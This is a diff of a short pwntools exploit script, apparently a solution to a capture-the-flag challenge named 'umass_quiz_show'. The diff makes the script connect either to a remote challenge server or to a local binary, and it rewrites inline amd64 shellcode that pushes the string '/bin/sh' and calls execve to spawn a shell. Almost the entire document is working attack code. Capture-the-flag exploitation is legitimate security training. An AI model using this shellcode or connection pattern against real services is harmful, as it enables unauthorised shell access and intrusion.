@@ -1,8 +1,12 @@
 from pwn import *
 
-
-p = remote("172.17.0.2", 6432);
-context.binary = 'static/umass_quiz_show'
+context.arch = 'amd64'
+if args.REMOTE:
+    host = "34.75.76.65"
+    port = 9005
+    p = remote(host, port)
+else:
+    p = process("./static/umass_quiz_show")
 
 if args.GDB:
     gdb.attach(p, gdbscript=f'''
@@ -10,14 +14,14 @@ if args.GDB:
     ''')
 
 payload = asm("""
-    xor rsi, rsi
     xor rdx, rdx
-    push rsi
-    mov rbx, 0x68732f6e69622f2f
-    push rbx
-    push rsp
-    pop rdi
+    xor rsi, rsi
     mov rax, 59
+    mov rbx, 0
+    push rbx
+    mov rbx, 0x68732f2f6e69622f
+    push rbx
+    mov rdi, rsp
     syscall
 """);
 
